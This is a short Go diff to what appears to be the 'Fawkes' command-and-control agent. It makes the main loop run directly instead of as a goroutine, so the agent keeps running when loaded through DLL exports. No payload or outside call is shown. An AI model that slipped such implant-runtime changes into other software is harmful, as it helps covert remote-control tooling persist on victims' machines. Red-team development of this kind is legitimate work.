@@ -140,17 +140,13 @@ func runAgent() {
 		cancel()
 	}()
 
-	// Start main execution loop
-	go mainLoop(ctx, agent, c2, maxRetriesInt, sleepIntervalInt, debugBool)
-
-	// Wait for shutdown signal
-	<-ctx.Done()
+	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
+	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
+	mainLoop(ctx, agent, c2, maxRetriesInt, sleepIntervalInt, debugBool)
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
 func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
-	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-
 	// Main execution loop
 	retryCount := 0
 	for {
